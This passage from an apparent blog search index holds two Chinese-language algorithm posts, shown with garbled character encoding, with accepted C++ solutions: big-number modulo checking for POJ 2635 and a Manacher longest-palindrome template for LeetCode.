<h3 id="é«˜ç²¾åº¦å¯¹å•ç²¾åº¦-1"><a href="#é«˜ç²¾åº¦å¯¹å•ç²¾åº¦-1" class="headerlink" title="é«˜ç²¾åº¦å¯¹å•ç²¾åº¦"></a>é«˜ç²¾åº¦å¯¹å•ç²¾åº¦</h3><p>ç®—æ³•çš„åŸç†æ˜¯æ ¹æ®</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(a + b) % c == (a % c + b % c) % c</span><br></pre></td></tr></table></figure>

<p>å› æ­¤é«˜ç²¾åº¦å¯¹å•ç²¾åº¦æ±‚æ¨¡ç­‰ä»·äºä»é«˜ä½å¼€å§‹è¿›è¡Œæ±‚æ¨¡ï¼Œç„¶åå°†ç»“æœå¾€ä½ä½ä¼ æ’­å³å¯</p>
<p>ç»ƒæ‰‹é¢˜ç›®ï¼š<a href="http://poj.org/problem?id=2635" target="_blank" rel="noopener">poj2635</a></p>
<p><code>AC</code>ä»£ç </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_NUM = <span class="number">1e6</span>;</span><br><span class="line"><span class="keyword">bool</span> notDeleted[MAX_NUM];</span><br><span class="line"><span class="keyword">int</span> prime[<span class="number">80000</span>], total;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPrime</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; MAX_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!notDeleted[i])&#123;</span><br><span class="line">            prime[total++] = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i * i; j &gt; <span class="number">0</span> &amp;&amp; j &lt; MAX_NUM; j += i)notDeleted[j] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkModZero</span><span class="params">(<span class="keyword">int</span> num[], <span class="keyword">int</span> len, <span class="keyword">int</span> checkPrime)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mod = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="comment">// ä»é«˜ä½æ±‚æ¨¡ï¼Œå¾€åä¼ æ’­</span></span><br><span class="line">        mod = (mod * <span class="number">1000</span> + num[i]) % checkPrime;</span><br><span class="line">    <span class="keyword">return</span> mod == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle</span><span class="params">(<span class="keyword">int</span> num[], <span class="keyword">int</span> &amp;len, <span class="keyword">char</span> buff[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span> = <span class="built_in">strlen</span>(buff), hand, ten, one;</span><br><span class="line">    <span class="keyword">char</span> tem;</span><br><span class="line">    buff[<span class="built_in">size</span>] = <span class="string">'\0'</span>, buff[<span class="built_in">size</span> + <span class="number">1</span>] = <span class="string">'\0'</span>, buff[<span class="built_in">size</span> + <span class="number">2</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="built_in">size</span> &gt;&gt; <span class="number">1</span>); i++)&#123;</span><br><span class="line">        tem = buff[i];</span><br><span class="line">        buff[i] = buff[<span class="built_in">size</span> - i - <span class="number">1</span>];</span><br><span class="line">        buff[<span class="built_in">size</span> - i - <span class="number">1</span>] = tem;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">0</span>; buff[len * <span class="number">3</span>] != <span class="string">'\0'</span>;len++)&#123;</span><br><span class="line">        <span class="comment">// è¿™é‡Œéœ€è¦å‹ä½ï¼Œå¦åˆ™ä¼šè¶…æ—¶</span></span><br><span class="line">        num[len] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (buff[len * <span class="number">3</span> + <span class="number">2</span>] != <span class="string">'\0'</span>)num[len] = num[len] * <span class="number">10</span> + buff[len * <span class="number">3</span> + <span class="number">2</span>] - <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span> (buff[len * <span class="number">3</span> + <span class="number">1</span>] != <span class="string">'\0'</span>)num[len] = num[len] * <span class="number">10</span> + buff[len * <span class="number">3</span> + <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">        num[len] = num[len] * <span class="number">10</span> + buff[len * <span class="number">3</span>] - <span class="string">'0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    getPrime();</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">105</span>];</span><br><span class="line">    <span class="keyword">int</span> l, len, num[<span class="number">105</span>];</span><br><span class="line">    <span class="keyword">bool</span> flag;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%s%d"</span>, buff, &amp;l))&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        flag = <span class="literal">false</span>;</span><br><span class="line">        handle(num, len, buff);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; total &amp;&amp; prime[i] &lt; l; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (checkModZero(num, len, prime[i]))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"BAD %d\n"</span>, prime[i]);</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!flag)<span class="built_in">printf</span>(<span class="string">"GOOD\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>é«˜ç²¾åº¦</tag>
        <tag>æ¨¡æ‹Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>é©¬æ‹‰è½¦ç®—æ³•æ¨¡æ¿</title>
    <url>/2021/03/04/%E9%A9%AC%E6%8B%89%E8%BD%A6%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é©¬æ‹‰è½¦ç®—æ³•æ˜¯Manacherç®—æ³•ï¼Œå®ƒæ˜¯ä¸€ä½åå«Manacherçš„äººåœ¨1975å¹´æå‡ºçš„ä¸€ç§ç®—æ³•ï¼Œç”¨äºåœ¨çº¿æ€§æ—¶é—´å†…è§£å†³å›æ–‡ä¸²é—®é¢˜ã€‚<a id="more"></a></p>
<h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>å¿™æ´»äº†ä¸€ä¸ªæ™šä¸Šï¼Œç»ˆäºæŠŠè¿™ä¸ªé«˜æ•ˆçš„ç®—æ³•æŒæ¡äº†ï¼Œè¯¥ç®—æ³•æ—¶é—´å¤æ‚åº¦ä¸º<code>O(N)</code>,ç©ºé—´å¤æ‚åº¦ä¹Ÿä¸º<code>O(N)</code>ã€‚</p>
<p>å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼Œæˆ‘ç›®å‰è¿˜æ²¡æœ‰èƒ½å¤ŸæŠŠå®ƒè®²é€šï¼Œæœ‰å…´è¶£çš„å¯ä»¥å‚è€ƒä¸‹é¢çš„é“¾æ¥è¿›è¡Œç†è§£ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<ul>
<li><p><a href="https://www.zhihu.com/question/330983016" target="_blank" rel="noopener">æ€ä¹ˆç†è§£â€œé©¬æ‹‰è½¦â€œmanacherç®—æ³•ï¼Ÿ</a></p>
</li>
<li><p><a href="https://www.bilibili.com/video/BV1rE411x78x" target="_blank" rel="noopener">Manacherï¼ˆé©¬æ‹‰è½¦ï¼‰</a></p>
</li>
</ul>
<p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/longest-palindromic-substring/" target="_blank" rel="noopener">LeetCode-æœ€é•¿å›æ–‡å­ä¸²</a></p>
<p><code>AC</code>ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">longestPalindrome</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123; <span class="keyword">return</span> manacher(s); &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">manacher</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> str = preProcess(s);</span><br><span class="line">        <span class="keyword">int</span> C = <span class="number">0</span>, R = <span class="number">0</span>, i_mirror, len = <span class="built_in">strlen</span>(str.c_str()), p[<span class="number">2003</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            i_mirror = <span class="number">2</span> * C - i;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; R) &#123;</span><br><span class="line">                <span class="comment">// åˆ©ç”¨å¯¹ç§°æ€§ï¼Œä½†æ˜¯è¦é˜²æ­¢è¶…è¿‡å³è¾¹ç•Œ</span></span><br><span class="line">                p[i] = min(p[i_mirror], R - i);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// åˆ©ç”¨ä¸­å¿ƒæ‰©å±•æ³•è¿›è¡Œæš´åŠ›</span></span><br><span class="line">            <span class="keyword">while</span> (str[i + p[i]] == str[i - p[i]]) p[i]++;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ˜¯å¦éœ€è¦æ›´æ–° R</span></span><br><span class="line">            <span class="keyword">if</span> (i + p[i] &gt; R) &#123;</span><br><span class="line">                C = i;</span><br><span class="line">                R = i + p[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ‰¾å‡ºæœ€é•¿å›æ–‡ä¸²çš„é•¿åº¦å¹¶è¿›è¡Œæˆªå–</span></span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> centerIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[i] &gt; maxLen) &#123;</span><br><span class="line">                maxLen = p[i];</span><br><span class="line">                centerIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> start = (centerIndex - maxLen) / <span class="number">2</span>;  <span class="comment">//åŸå­—ç¬¦ä¸²ä¸‹æ ‡</span></span><br><span class="line">        <span class="keyword">return</span> s.substr(start, maxLen - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">preProcess</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.length(), j = <span class="number">0</span>;</span><br><span class="line">        <span class="function"><span class="built_in">string</span> <span class="title">t</span><span class="params">(<span class="number">2003</span>, <span class="string">'\0'</span>)</span></span>;</span><br><span class="line">        t[j++] = <span class="string">'^'</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            t[j++] = <span class="string">'#'</span>;</span><br><span class="line">            t[j++] = s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        t[j++] = <span class="string">'#'</span>;</span><br><span class="line">        t[j++] = <span class="string">'$'</span>;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>å­—ç¬¦ä¸²</tag>
      </tags>
  </entry>
</search>
